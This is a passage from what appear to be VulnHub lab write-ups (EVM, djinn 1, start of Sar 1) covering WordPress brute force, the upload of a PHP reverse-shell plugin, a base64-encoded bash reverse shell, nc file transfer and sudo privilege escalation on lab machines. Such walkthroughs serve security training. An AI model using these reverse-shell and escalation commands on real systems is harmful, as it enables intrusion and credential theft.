            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">gray</span><span class="si">}</span><span class="s">[-] User: </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s"> Password: </span><span class="si">{</span><span class="n">password</span><span class="p">:</span><span class="mi">10</span><span class="si">}{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}</span><span class="s">[+] User: </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s"> Password: </span><span class="si">{</span><span class="n">password</span><span class="p">:</span><span class="mi">10</span><span class="si">}{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

</code></pre></div></div>
<p>I run the script and after a time we have the password.</p>

<p><strong>note:</strong> for do this faster you can use threads.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./bf.py 192.168.56.103 c0rrupt3d_brain wordlist.txt
...
<span class="o">[</span>+] User: c0rrupt3d_brain Password: 24992499 
</code></pre></div></div>

<p>We login to the wordpress web page and have successful access.</p>

<p><img src="/assets/images/evm/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/evm/screenshot-6.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="inject-malicious-plugin">Inject Malicious Plugin</h3>
<p>We can upload php files as a plugin, for this I create a simple php reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>shell.php 
&lt;?php <span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span> ?&gt;
</code></pre></div></div>

<p>Then we add a new plugin in the following path <strong>Plugins -&gt; Add New -&gt; Upload Plugin</strong>, and later we click <strong>Install Now</strong>.</p>

<p><img src="/assets/images/evm/screenshot-7.png" alt="" /></p>

<p><img src="/assets/images/evm/screenshot-8.png" alt="" /></p>

<p>Apparently we can’t see it, so we go to <strong>Media -&gt; Library</strong> and we can see our shell uploaded.</p>

<p><img src="/assets/images/evm/screenshot-9.png" alt="" /></p>

<p>We access it and we can see the URL to run the reverse shell.</p>

<p><img src="/assets/images/evm/screenshot-10.png" alt="" /></p>

<p>Then we first setup a netcat listener on port 443 and request with the browser the reverse shell.
<img src="/assets/images/evm/screenshot-11.png" alt="" /></p>

<p>And we get a reverse shell with permissions that the web application is running.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.144] 43786
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1439<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
&lt;var/www/html/wordpress/wp-content/uploads/2021/08<span class="nv">$ </span>script bash /dev/null
script bash /dev/null
<span class="nv">$ </span>bash
bash
&lt;var/www/html/wordpress/wp-content/uploads/2021/08<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="exposed-credentials">Exposed Credentials</h3>

<p>Into the <strong>/home/root3r</strong> directory I found the password for the root user in the <strong>.root_password_ssh.txt</strong> file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>    
total 40            
drwxr-xr-x 3 www-data www-data 4096 Nov  1  2019 <span class="nb">.</span>  
drwxr-xr-x 3 root     root     4096 Oct 30  2019 ..  
<span class="nt">-rw-r--r--</span> 1 www-data www-data  515 Oct 30  2019 .bash_history
<span class="nt">-rw-r--r--</span> 1 www-data www-data  220 Oct 30  2019 .bash_logout 
<span class="nt">-rw-r--r--</span> 1 www-data www-data 3771 Oct 30  2019 .bashrc
drwxr-xr-x 2 www-data www-data 4096 Oct 30  2019 .cache
<span class="nt">-rw-r--r--</span> 1 www-data www-data   22 Oct 30  2019 .mysql_history
<span class="nt">-rw-r--r--</span> 1 www-data www-data  655 Oct 30  2019 .profile
<span class="nt">-rw-r--r--</span> 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt
<span class="nt">-rw-r--r--</span> 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful
<span class="nt">-rw-r--r--</span> 1 root     root        4 Nov  1  2019 test.txt
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="nv">$ </span><span class="nb">cat</span> .roo<span class="k">*</span>
<span class="nb">cat</span> .roo<span class="k">*</span>
willy26
</code></pre></div></div>
<p>Then we switch to the root user with the found password, and we get root.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="nv">$ </span>su -
su -
Password: willy26

root@ubuntu-extermely-vulnerable-m4ch1ine:~# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@ubuntu-extermely-vulnerable-m4ch1ine:~# <span class="nb">cat </span>proof.txt
<span class="nb">cat </span>proof.txt
voila you have successfully pwned me :<span class="o">)</span> <span class="o">!!!</span>
:D
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - djinn 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>July 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically.</p>

<p><strong>Author:</strong> 0xmzfr</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Read two flags (user and root) which is present in user.txt and root.txt respectively.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/djinn-1,397/">https://www.vulnhub.com/entry/djinn-1,397/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start on the local network discovering our target with netdiscover.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts 
                                                               
 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222 
 ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
 <span class="nt">------------------------------------------------------------------------</span>
 192.168.179.143 00:0c:29:ee:b5:bb      3     180  VMware, Inc. 
 192.168.179.254 00:50:56:e2:8b:9f      1      42  VMware, Inc.
</code></pre></div></div>
<h3 id="port-scanning">Port Scanning</h3>
<p>Then I proceed to scan all TCP ports with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-T5</span> <span class="nt">-p-</span> 192.168.179.143 <span class="nt">-oG</span> nmap-tcp-ports.txt 
...
PORT     STATE    SERVICE REASON
21/tcp   open     ftp     syn-ack ttl 64
22/tcp   filtered ssh     port-unreach ttl 64
1337/tcp open     waste   syn-ack ttl 64
7331/tcp open     swx     syn-ack ttl 64
MAC Address: 00:0C:29:EE:B5:BB <span class="o">(</span>VMware<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>With nmap I perform the enumeration of services and versions of open TCP ports, OS detection, script scanning, and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-A</span> <span class="nt">-p21</span>,1337,7331 192.168.179.143 <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT     STATE SERVICE REASON         VERSION  
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.3                                                                                                                 
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>                                                                                                             
| <span class="nt">-rw-r--r--</span>    1 0        0              11 Oct 20  2019 creds.txt                                                                                                
| <span class="nt">-rw-r--r--</span>    1 0        0             128 Oct 21  2019 game.txt                                                                                                 
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt                                                                                              
| ftp-syst:                                                                                                                                                        
|   STAT:                                                                                                                                                          
| FTP server status:                                                                                                                                               
|      Connected to ::ffff:192.168.179.1                                                                                                                           
|      Logged <span class="k">in </span>as ftp                                                                                                                                            
|      TYPE: ASCII                                                                                                                                                 
|      No session bandwidth limit                                                                                                                                  
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300                                                                                                                           
|      Control connection is plain text                                                                                                                            
|      Data connections will be plain text                                                                                                                         
|      At session startup, client count was 2                                                                                                                      
|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                         
|_End of status                                                                                                                                                    
1337/tcp open  waste?  syn-ack ttl 64                                                                                                                              
| fingerprint-strings:                                                                                                                                             
|   NULL:                                                                                                                                                          
|     ____ _____ _                                                                                                                                                 
|     ___| __ _ _ __ ___ ___ |_ _<span class="o">(</span>_<span class="o">)</span>_ __ ___ ___                                                                                                                   
|     <span class="se">\x</span>20/ _ <span class="se">\x</span>20 | | | | <span class="s1">'_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/                                                                      
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|                                                                                                               
|     Let'</span>s see how good you are with simple maths                                                                                                                 
|     Answer my questions 1000 <span class="nb">times </span>and I<span class="s1">'ll give you your gift.                                                                                                  
|     '</span>/<span class="s1">', 8)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '</span>_ <span class="sb">`</span> _ <span class="se">\x</span>20/ _ <span class="se">\n</span>| |_| | <span class="o">(</span>_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let<span class="s1">'s see how good you are with simple maths
|     Answer my questions 1000 times and I'</span>ll give you your gift.
|_    <span class="s1">'*'</span>, 9<span class="o">)</span>
7331/tcp open  http    syn-ack ttl 64 Werkzeug httpd 0.16.0 <span class="o">(</span>Python 2.7.15+<span class="o">)</span>                                                                                       
| http-methods:                                                                                                                                                    
|_  Supported Methods: HEAD OPTIONS GET                                                                                                                            
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+                                                                                                               
|_http-title: Lost <span class="k">in </span>space 
...
</code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>
<p>The anonymous login is enabled, so I log in to this service and find three text files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ftp 192.168.179.143
Connected to 192.168.179.143.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>192.168.179.143:s4rgaz<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 21  2019 <span class="nb">.</span>
drwxr-xr-x    2 0        115          4096 Oct 21  2019 ..
<span class="nt">-rw-r--r--</span>    1 0        0              11 Oct 20  2019 creds.txt
<span class="nt">-rw-r--r--</span>    1 0        0             128 Oct 21  2019 game.txt
<span class="nt">-rw-r--r--</span>    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
</code></pre></div></div>
<p>I download the files to my atacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get creds.txt
<span class="nb">local</span>: creds.txt remote: creds.txt
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>creds.txt <span class="o">(</span>11 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
11 bytes received <span class="k">in </span>0.05 secs <span class="o">(</span>0.2006 kB/s<span class="o">)</span>
ftp&gt; get game.txt
<span class="nb">local</span>: game.txt remote: game.txt
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>game.txt <span class="o">(</span>128 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
128 bytes received <span class="k">in </span>0.07 secs <span class="o">(</span>1.8517 kB/s<span class="o">)</span>
ftp&gt; get message.txt
<span class="nb">local</span>: message.txt remote: message.txt
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>message.txt <span class="o">(</span>113 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
113 bytes received <span class="k">in </span>0.02 secs <span class="o">(</span>5.6426 kB/s<span class="o">)</span>
</code></pre></div></div>

<p>I find possible credentials for the nitu user, a note about a game running on port 1337 and a message specifying that a user is going on holidays.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>creds.txt 
nitu:81299
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>game.txt 
oh and I forgot to tell you I<span class="s1">'ve setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
root@kali:~$ cat message.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And do not mess up anything.
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>Then I interact with the web service and not find nothing interesting, so I run gobuster to search for hidden files and directories.</p>

<p><img src="/assets/images/djinn/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.143:7331 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
...
http://192.168.179.143:7331/wish                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 385]
http://192.168.179.143:7331/genie                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1676]
</code></pre></div></div>
<p>In the output we can see only two possible files, so I request for the wish file and it redirects me to a panel that allows executing system commands.</p>

<p><img src="/assets/images/djinn/screenshot-2.png" alt="" /></p>

<p>I execute the <strong>id</strong> command and this return the result, so it is possible to run commands.</p>

<p><img src="/assets/images/djinn/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/djinn/screenshot-4.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="command-execution">Command Execution</h3>
<p>Since it’s not possible execute commands directly, we need to base64 encode our reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"</span> | <span class="nb">base64
</span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4xLzQ0MyAwPiYxCg<span class="o">==</span>
</code></pre></div></div>

<p>We first need set up a netcat listener on port 443, then we copy our reverse shell encoded and paste it into the textbox along with the echo command, piping it to decode it and piping it to execute it with bash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4xLzQ0MyAwPiYxCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</code></pre></div></div>
<p><img src="/assets/images/djinn/screenshot-5.png" alt="" /></p>

<p>And we have a shell with www-data user permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.143] 37832
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>652<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@djinn:/opt/80<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>Into the directory <strong>/home/nitish/.dev</strong> I found credentials for the nitish user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@djinn:/home/nitish/.dev<span class="nv">$ </span><span class="nb">ls
ls
</span>creds.txt
www-data@djinn:/home/nitish/.dev<span class="nv">$ </span><span class="nb">cat </span>creds.txt
<span class="nb">cat </span>creds.txt
nitish:p4ssw0rdStr3r0n9
</code></pre></div></div>

<p>Then I switch to the nitish user with the found credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@djinn:/home/nitish/.dev<span class="nv">$ </span>su nitish 
su: must be run from a terminal
www-data@djinn:/home/nitish/.dev<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
&lt;.dev<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
www-data@djinn:/home/nitish/.dev<span class="nv">$ </span>su nitish
Password: p4ssw0rdStr3r0n9

nitish@djinn:~/.dev<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nitish<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nitish<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nitish<span class="o">)</span>
</code></pre></div></div>

<p>By listing the sudo permissions, the nitish user can execute the genie binary with sudo as the sam user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nitish@djinn:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>nitish on djinn:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User nitish may run the following commands on djinn:
    <span class="o">(</span>sam<span class="o">)</span> NOPASSWD: /usr/bin/genie
</code></pre></div></div>

<p>To escalate to the <strong>sam</strong> user and get a shell I used the following instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nitish@djinn:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sam /usr/bin/genie <span class="nt">-g</span> god <span class="nt">-e</span> <span class="nb">id</span> <span class="nt">-cmd</span>
my man!!
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lxd<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,114<span class="o">(</span>sambashare<span class="o">)</span>
<span class="nv">$ </span><span class="nb">whoami
</span>sam
<span class="nv">$ </span>bash
sam@djinn:~<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>
<p>Enumerating for sudo permissions I found that the sam user can run the <strong>lago</strong> binary as the root user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@djinn:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>sam on djinn:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User sam may run the following commands on djinn:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /root/lago
</code></pre></div></div>
<p>I run the <strong>lago</strong> script with sudo permissions, but I can’t find a way to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@djinn:/home/sam<span class="nv">$ </span><span class="nb">sudo</span> /root/lago
<span class="nb">sudo</span> /root/lago
What <span class="k">do </span>you want to <span class="k">do</span> ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: /bin/sh
/bin/sh
Better Luck next <span class="nb">time</span>
</code></pre></div></div>

<p>Listing in the sam’s home directory, I found a compiled python file, execute it, and I can see that it’s related to the lago script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@djinn:/home/sam<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
...
<span class="nt">-rw-r--r--</span> 1 sam  sam    1749 Nov  7  2019 .pyc
...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@djinn:/home/sam<span class="nv">$ </span>python .pyc
python .pyc
What <span class="k">do </span>you want to <span class="k">do</span> ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice: 1
1
Working on it!!
</code></pre></div></div>

<p>Then I transfer this script to my machine, for this we firt set up a netcat listener on the attacking machine as shown:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 <span class="o">&gt;</span> pyc
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p>And on the target machine we execute the following netcat command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@djinn:/home/sam<span class="nv">$ </span>nc 192.168.179.1 443 &lt; .pyc
</code></pre></div></div>

<p>Ones downloaded the file, we’ll try to decompile it to be able to read the code in plain text. For This we first need install the <strong>decompyle3</strong> utility and then decompile it, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>pip3 <span class="nb">install </span>decompyle3

root@kali:~<span class="nv">$ </span>decompyle3 pyc
...
def guessit<span class="o">()</span>:
    num <span class="o">=</span> randint<span class="o">(</span>1, 101<span class="o">)</span>
    print<span class="o">(</span><span class="s2">"Choose a number between 1 to 100: "</span><span class="o">)</span>

    try:
        s <span class="o">=</span> input<span class="o">(</span><span class="s2">"Enter your number: "</span><span class="o">)</span> 
        <span class="k">if </span>s <span class="o">==</span> num:
            system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>

        <span class="k">else</span>:
            print<span class="o">(</span><span class="s2">"Better Luck next time"</span><span class="o">)</span>
    except:
        print<span class="o">(</span><span class="s2">"Slow claps again"</span><span class="o">)</span>
...
</code></pre></div></div>

<p>As we can see in the previous result, this script generates a random number and then asks to the user for the generated number and if is true it will execute a /bin/sh, knowing how it works we can bypass this by inserting the word <strong>num</strong> where it asks us to enter a number from 1 to 100, and we get a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@djinn:/opt/80<span class="nv">$ </span><span class="nb">sudo</span> /root/lago
<span class="nb">sudo</span> /root/lago
What <span class="k">do </span>you want to <span class="k">do</span> ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: num
num
<span class="c"># id</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Sar 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>July 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is an OSCP-Like VM with the intent of gaining experience in the world of penetration testing.</p>

<p><strong>Author:</strong> Love</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/sar-1,425/">https://www.vulnhub.com/entry/sar-1,425/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start discovering the taget machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.142 00:0c:29:88:c6:9e       VMware, Inc.
192.168.179.254 00:50:56:ea:a9:69       VMware, Inc.

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned <span class="k">in </span>3.242 seconds <span class="o">(</span>78.96 hosts/sec<span class="o">)</span><span class="nb">.</span> 2 responded
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Identified our target, I proceed to perform a UDP and TCP port scan with unicornscan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.142 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.142
...
TCP open                    http[   80]         from 192.168.179.142  ttl 64
...
UDP open                 unknown[48088]         from 192.168.179.142  ttl 64
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>After I do the service enumeration on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span> 192.168.179.142 <span class="nt">-oN</span> service-enum.txt
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:88:C6:9E <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>I access to the web page and find the apache default page, then I look for the robots.txt file and find the <strong>sar2HTML</strong> name.</p>

<p><img src="/assets/images/sar/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/sar/screenshot-2.png" alt="" /></p>

<p>I request this resource and redirects me to your home page.</p>

<p>Sar2html is web based frontend for performance monitoring. It converts sar binary data to graphical format and keep historical data in it’s database.</p>

<p><img src="/assets/images/sar/screenshot-3.png" alt="" /></p>

<p>Then I look vulnerabilities for sar2html version 3.2.1, and found that it’s vulnerable to Remote Command Execution.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit sar2html 3.2.1
<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
 Exploit Title                                              |  Path
<span class="nt">------------------------------------------------------------</span> <span class="nt">------------------------</span>
sar2html 3.2.1 - <span class="s1">'plot'</span> Remote Code Execution               | php/webapps/49344.py
